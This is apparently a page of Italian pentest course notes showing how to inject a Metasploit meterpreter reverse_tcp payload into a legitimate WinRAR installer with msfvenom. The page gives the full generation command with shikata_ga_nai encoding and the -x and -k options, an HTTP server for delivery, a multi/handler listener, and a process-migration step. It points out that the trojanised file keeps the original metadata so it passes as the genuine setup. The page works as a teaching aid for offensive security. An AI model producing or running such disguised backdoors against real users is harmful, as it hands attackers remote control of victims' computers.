# Injecting Payloads Into Windows Portable Executables

<figure><img src="../../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1042).png" alt=""><figcaption></figcaption></figure>

è possibile usare il parametro -x per fare in modo che il payload venga inserito in un file eseguibile, o che esso venga usato come template. è possibile usare -k per dire a msfvenom di mantenere le funzionalità dell'eseguibile originale.

Ad esempio si può usare il file eseguibile WinRar che funziona bene a questo scopo.

## Scaricare un file eseguibile legittimo

Scarichiamo il file setup di WinRAR:

<figure><img src="../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

E scarichiamo l'ultimo setup file a 32 bit:

<figure><img src="../../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>

E lo salviamo nella cartella Downloads:

<figure><img src="../../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>

## Generiamo il payload e lo iniettiamo (injecting) in un eseguibile

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /home/kali/Downloads/wrar602.exe > /home/kali/Desktop/Windows_Payloads/winrar.exe
```

<figure><img src="../../.gitbook/assets/image (1046).png" alt=""><figcaption></figcaption></figure>

## Trasferiamo il file iniettato sul target

```
sudo python -m SimpleHTTPServer 80
```

<figure><img src="../../.gitbook/assets/image (1047).png" alt=""><figcaption></figcaption></figure>

### Apriamo un listener con msfconsole

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

<figure><img src="../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>

### Eseguiamo il file sul target

Scarichiamo il file dal webserver e lo eseguiamo cliccandoci sopra

<figure><img src="../../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1050).png" alt=""><figcaption></figcaption></figure>

Vediamo che effettivamente il file sembra sia riconosciuto come il setup vero di winrar, ma poiché non abbiamo specificato a msfvenom -k che gli dice di mantenere le funzionalità originali dell'eseguibile, quando facciamo doppio click esegue il payload ma non esegue il setup dell'installazione winrar. Tuttavia possiamo notare che tutti i metadati del file originale vengono riportati anche su questo payload winrar.

### Riceviamo la connessione dalla vittima sulla kali attaccante

<figure><img src="../../.gitbook/assets/image (1051).png" alt=""><figcaption></figcaption></figure>

## Post exploitation: Migrare il processo

Una volta ottenuta la connessione ad una vittima con una meterpreter, consiglia di eseguire sempre un modulo di post exploitation che fa migrare il processo (su notepad) in modo da mantenere la connessione anche qualora il processo originale venga terminato su windows.

```
runh post/windows/menage/migrate
```

<figure><img src="../../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>

## Generare il payload con injecting e mantenere le funzioni dell'eseguibile originale

è possibile usare l'opzione -k per dire a msfvenom di mantenere le funzionalità dell'eseguibile originale.

Quindi se iniettiamo il payload nel portal executable del setup winrar, quando facciamo l'esecuzione con doppio click sul file generato chiamerà il payload ma continuerà anche ad eseguire il setup winrar.&#x20;

{% hint style="info" %}
Attenzione: -k non è supportato da tutti gli eseguibili. Ad esempio winrar.exe non lo supporta.
{% endhint %}

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x /home/kali/Downloads/wrar602.exe > /home/kali/Desktop/Windows_Payloads/winrar-new.exe
```

<figure><img src="../../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>

Qui sopra possiamo vedere il messaggio di errore.

Comunque questa tecnica non è più molto usata perché sì, si va a cambiare la firma del file virale, però comunque gli antivirus moderni riescono a riconoscere ugualmente e bloccare questo tipo di payload con encoding fatto con msfvenom in particolare.
